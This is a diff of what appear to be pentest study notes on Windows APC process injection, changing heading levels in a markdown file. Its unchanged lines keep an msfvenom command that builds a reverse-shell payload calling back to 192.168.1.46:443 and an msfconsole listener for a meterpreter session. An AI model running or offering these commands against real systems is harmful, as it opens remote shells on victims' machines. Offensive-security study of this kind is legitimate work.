@@ -12,9 +12,7 @@
 
 * When a thread is scheduled, queued APCs get executed
   
-  یک 
-  
-  #### Apc-local.cpp
+  ###### Apc-local.cpp
   
   ```cpp
   #include <Windows.h>
@@ -43,13 +41,13 @@
   }
   ```
   
-  ### Payload
+  #### Payload
   
   ```bash
   msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.46 LPORT=443  -f c 
   ```
   
-  ### Listener
+  #### Listener
   
   ```bash
   msfconsole -x "use exploits/multi/handler; set lhost 192.168.1.46; set lport 443; set payload windows/meterpreter/reverse_tcp; exploit"
